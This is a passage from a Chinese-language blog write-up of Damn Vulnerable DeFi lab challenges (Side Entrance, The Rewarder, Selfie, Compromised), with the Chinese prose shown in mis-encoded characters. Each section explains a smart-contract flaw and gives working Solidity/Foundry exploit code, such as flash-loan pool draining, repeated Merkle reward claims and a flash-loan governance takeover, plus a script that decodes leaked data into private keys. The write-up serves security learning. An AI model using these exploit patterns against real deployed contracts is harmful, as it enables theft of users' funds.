class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract IFlashLoanEtherReceiver &#123;</span><br><span class="line">    address player;</span><br><span class="line">    address recovery;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(SideEntranceLenderPool _pool, address _player, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        player = _player;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callFlashLoan(uint256 amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">        payable(recovery).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SideEntranceChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_sideEntrance() public checkSolvedByPlayer &#123;</span><br><span class="line">        IFlashLoanEtherReceiver receiver = new IFlashLoanEtherReceiver(pool, player, recovery);</span><br><span class="line">        receiver.callFlashLoan(1000e18);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="the-rewarder">[5] The Rewarder</h1>
<p>æ¼æ´åœ¨ claimRewards é‡Œï¼ŒåŒä¸€æ¬¡ claim å¤šä¸ªç›¸åŒçš„è´¦æˆ·ä¸ä¼šæœ‰é—®é¢˜...</p>
<p>å› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œaddress(token) ==
address(0)ï¼Œä¸ä¼šè¿›å…¥_setClaimedï¼Œä¹‹åçš„è°ƒç”¨ token ==
inputTokens[inputClaim.tokenIndex]ï¼Œè¿›å…¥ else
åˆ†æ”¯ï¼Œä¹Ÿä¸ä¼šè¿›å…¥_setClaimedï¼Œç­‰åˆ°ä¸‹ä¸€ç§ä»£å¸çš„æ—¶å€™ï¼Œä½ å°±ç®—æŠŠæˆ‘ä¸Šä¸€ä¸ªä»£å¸
setClaimed ä¹Ÿæ²¡ç”¨äº†ã€‚</p>
<p>æ„Ÿè§‰è¿˜æ˜¯å®¡ä»£ç çš„è€å¿ƒä¸å¤Ÿ..ä¸æ¸…æ¥š merkel tree
çš„å·¥ä½œåŸç†ï¼Œæƒ³ä¸€ç¬”è°ƒç”¨å¹²å‡€ï¼Œä½†æ¯æ¬¡ claim çš„ amount ä¹Ÿè¦å®Œå…¨ç¬¦åˆ json
æ–‡ä»¶é‡Œçš„ amountï¼Œæ‰€ä»¥åªèƒ½å¤šç¬”ã€‚</p>
<p>é‚£æ—¢ç„¶æƒ³åˆ°å¤šç¬”è°ƒå‡ºæ¥ï¼Œå°±è‚¯å®šè¦ç ”ç©¶ claimRewards
å‡½æ•°ï¼Œç„¶åæ¨¡æ‹Ÿä¸€ä¸‹å°±èƒ½å‘ç°è¿™ä¸ª if åˆ¤æ–­æ¡ä»¶æœ‰é—®é¢˜ã€‚</p>
<p>æ²‰ä¸‹å¿ƒæ¥ï¼Œæ¬²é€Ÿåˆ™ä¸è¾¾ã€‚</p>
<p>expå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">function test_theRewarder() public checkSolvedByPlayer &#123;</span><br><span class="line">        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;</span><br><span class="line">        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;</span><br><span class="line"></span><br><span class="line">        bytes32[] memory dvtLeaves = _loadRewards(&quot;/test/the-rewarder/dvt-distribution.json&quot;);</span><br><span class="line">        bytes32[] memory wethLeaves = _loadRewards(&quot;/test/the-rewarder/weth-distribution.json&quot;);</span><br><span class="line"></span><br><span class="line">        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;</span><br><span class="line">        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;</span><br><span class="line">        uint totalTxCount = dvtTxCount + wethTxCount;</span><br><span class="line"></span><br><span class="line">        IERC20[] memory tokensToClaim = new IERC20[](2);</span><br><span class="line">        tokensToClaim[0] = IERC20(address(dvt));</span><br><span class="line">        tokensToClaim[1] = IERC20(address(weth));</span><br><span class="line"></span><br><span class="line">        // Create Alice&#x27;s claims</span><br><span class="line">        Claim[] memory claims = new Claim[](totalTxCount);</span><br><span class="line"></span><br><span class="line">        for (uint i = 0; i &lt; totalTxCount; i++) &#123;</span><br><span class="line">            if (i &lt; dvtTxCount) &#123;</span><br><span class="line">                claims[i] = Claim(&#123;</span><br><span class="line">                    batchNumber: 0, // claim corresponds to first DVT batch</span><br><span class="line">                    amount: PLAYER_DVT_CLAIM_AMOUNT,</span><br><span class="line">                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array</span><br><span class="line">                    proof: merkle.getProof(dvtLeaves, 188) // Alice&#x27;s address is at index 2</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                claims[i] = Claim(&#123;</span><br><span class="line">                    batchNumber: 0, // claim corresponds to first DVT batch</span><br><span class="line">                    amount: PLAYER_WETH_CLAIM_AMOUNT,</span><br><span class="line">                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array</span><br><span class="line">                    proof: merkle.getProof(wethLeaves, 188) // Alice&#x27;s address is at index 2</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        distributor.claimRewards(&#123;</span><br><span class="line">            inputClaims: claims,</span><br><span class="line">            inputTokens: tokensToClaim</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        dvt.transfer(recovery, dvt.balanceOf(player));</span><br><span class="line">        weth.transfer(recovery, weth.balanceOf(player));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="selfie">[6] Selfie</h1>
<p>è¿™é“é¢˜å®ç°äº†ä¸ª fancy governance mechanismï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡
governance.executeAction è°ƒç”¨
emergencyExit(player)ï¼Œåº”è¯¥å°±å¯ä»¥æå–æ‰€æœ‰çš„é’±äº†ã€‚</p>
<p>ä¸»è¦é—®é¢˜æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªæ˜¯ç»•è¿‡ queueAction é‡Œçš„
_hasEnoughVotesï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡åœ¨ onFlashLoan é‡Œè°ƒç”¨ queueAction
æ¥å®ç°</p>
<p>ç¬¬äºŒä¸ªé—®é¢˜æ˜¯è¦ç»•è¿‡ timestampï¼Œè®© timedelta å¤§äº 2
daysã€‚è¿™ä¸ªæˆ‘å®åœ¨æƒ³ä¸å‡ºæ¥äº†ï¼Œæˆ‘è§‰å¾—ç°å®ä¸­åº”è¯¥å°±æ˜¯éš”ä¸¤å¤©ä¹‹åå†è°ƒç”¨ï¼Œå°±èƒ½ç»•è¿‡äº†å§ã€‚</p>
<p>çœ‹å®Œåˆ«äººçš„wpï¼Œå±…ç„¶ç›´æ¥ç”¨vm.warp(block.timestamp + 2
days);ç»•è¿‡äº†...å¥½å§ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import &#123;IERC3156FlashBorrower&#125; from &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Expoliter is IERC3156FlashBorrower &#123;</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    address recovery;</span><br><span class="line">    uint256 actionId;</span><br><span class="line"></span><br><span class="line">    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;</span><br><span class="line">    uint256 constant TOKENS_IN_POOL = 1_500_000e18;</span><br><span class="line"></span><br><span class="line">    DamnValuableVotes token;</span><br><span class="line">    SimpleGovernance governance;</span><br><span class="line">    SelfiePool pool;</span><br><span class="line">    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">        governance = _governance;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address receiver, address _token, uint256 _amount, uint256 nonce, bytes calldata _data) public returns (bytes32) &#123;</span><br><span class="line">        token.delegate(address(this));</span><br><span class="line">        token.approve(address(pool), TOKENS_IN_POOL);</span><br><span class="line">        actionId = governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));</span><br><span class="line">        return CALLBACK_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public &#123;</span><br><span class="line">        pool.flashLoan(this, address(token), TOKENS_IN_POOL, &quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step2() public &#123;</span><br><span class="line">        governance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test_selfie() public checkSolvedByPlayer &#123;</span><br><span class="line">    Expoliter expoliter = new Expoliter(token, governance, pool, recovery);</span><br><span class="line">    expoliter.step1();</span><br><span class="line">    vm.warp(block.timestamp + 2 days);</span><br><span class="line">    expoliter.step2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="compromised">[7] Compromised</h1>
<p>è¿™é¢˜æ˜¯çœŸæ‡µbäº†ï¼Œä¸çŸ¥é“é¢˜é¢ç»™çš„é‚£ä¸²æ•°å­—æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹äº†wpä¹‹åå¯ä»¥é€šè¿‡å®ƒæ¥è§£ç ç§é’¥ï¼Œè§£ç expå¦‚ä¸‹</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToAscii</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> ascii = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; hex.<span class="property">length</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        ascii += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ascii;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decodeBase64</span>(<span class="params">base64Str</span>) &#123;</span><br><span class="line">    <span class="comment">// Decode Base64 to ASCII</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">atob</span>(base64Str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> leakedInformation = [</span><br><span class="line">    <span class="string">&#x27;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">leakedInformation.<span class="title function_">forEach</span>(<span class="function"><span class="params">leak</span> =&gt;</span> &#123;</span><br><span class="line">    hexStr = leak.<span class="title function_">split</span>(<span class="string">` `</span>).<span class="title function_">join</span>(<span class="string">``</span>).<span class="title function_">toString</span>()</span><br><span class="line">    <span class="keyword">const</span> asciiStr = <span class="title function_">hexToAscii</span>(hexStr);</span><br><span class="line">    <span class="keyword">const</span> decodedStr = <span class="title function_">decodeBase64</span>(asciiStr);</span><br><span class="line">    <span class="keyword">const</span> privateKey = decodedStr;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Private Key:&quot;</span>, privateKey);</span><br><span class="line">    <span class="comment">// Create a wallet instance from the private key</span></span><br><span class="line">    <span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey);</span><br><span class="line">    <span class="comment">// Get the public key</span></span><br><span class="line">    <span class="keyword">const</span> address = wallet.<span class="property">address</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Public Key:&quot;</span>, address);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ä¸‹é¢çš„ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Private Key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span><br><span class="line">Public Key: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15</span><br><span class="line">Private Key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</span><br><span class="line">Public Key: 0x81A5D6E50C214044bE44cA0CB057fe119097850c</span><br></pre></td></tr></table></figure>
<p>å—ä¸äº†äº†...æˆ‘ä¹Ÿcompromiseäº†ï¼Œä¸æ‡‚æ€ä¹ˆåœ¨forgeé‡ŒéªŒè¯å…¬ç§é’¥ï¼Œå…ˆç•¥è¿‡å»äº†ğŸ‘‰ğŸ‘ˆ</p>
<h1 id="section">[8]</h1>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>æœ¬æ–‡ä½œè€…ï¼š </strong>HeyGap
  </li>
  <li class="post-copyright-link">
    <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
    <a href="http://heygap.github.io/2024/08/26/blockchain%20-%20DVD%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" title="blockchain - Damn Vulnerable Defi é¶åœºå¤ç°">http://heygap.github.io/2024/08/26/blockchain - DVDé¶åœºå¤ç°/</a>
  </li>
  <li class="post-copyright-license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>
</div>


      <div>
        
          <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------æ–‡ç« å°±åˆ°è¿™é‡Œå•¦ï¼<i class="fa fa-paw"></i>æ„Ÿè°¢æ‚¨çš„é˜…è¯»XD-------------</div>
    
</div>
        
      </div>

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Blockchain/" rel="tag"># Blockchain</a>
              <a href="/tags/Smart-Contract/" rel="tag"># Smart Contract</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/07/19/blockchain%20-%20Ethernaut%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" rel="prev" title="blockchain - Ethernautæ™ºèƒ½åˆçº¦æ¼æ´é¶åœºå¤ç°">
      <i class="fa fa-chevron-left"></i> blockchain - Ethernautæ™ºèƒ½åˆçº¦æ¼æ´é¶åœºå¤ç°
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/08/27/CSBasics%20-%20NJU_Program_Analysis_Note/" rel="next" title="CSBasics - NJU_Program_Analysis_Note">
      CSBasics - NJU_Program_Analysis_Note <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">[0] ç¯å¢ƒè®¾ç½®</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unstoppable"><span class="nav-number">2.</span> <span class="nav-text">[1] Unstoppable</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#naivereceiver"><span class="nav-number">3.</span> <span class="nav-text">[2] NaiveReceiver</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#truster"><span class="nav-number">4.</span> <span class="nav-text">[3] Truster</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#side-entrance"><span class="nav-number">5.</span> <span class="nav-text">[4] Side Entrance</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#the-rewarder"><span class="nav-number">6.</span> <span class="nav-text">[5] The Rewarder</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#selfie"><span class="nav-number">7.</span> <span class="nav-text">[6] Selfie</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#compromised"><span class="nav-number">8.</span> <span class="nav-text">[7] Compromised</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#section"><span class="nav-number">9.</span> <span class="nav-text">[8]</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="HeyGap"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">HeyGap</p>
  <div class="site-description" itemprop="description">An undergraduate student of Cybersecurity at SDU.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">27</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">22</span>
        <span class="site-state-item-name">æ ‡ç­¾</span>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    Chat
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/HeyGap" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;HeyGap" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/2310769056@qq.com" title="E-Mail â†’ 2310769056@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">HeyGap</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  

</body>
</html>
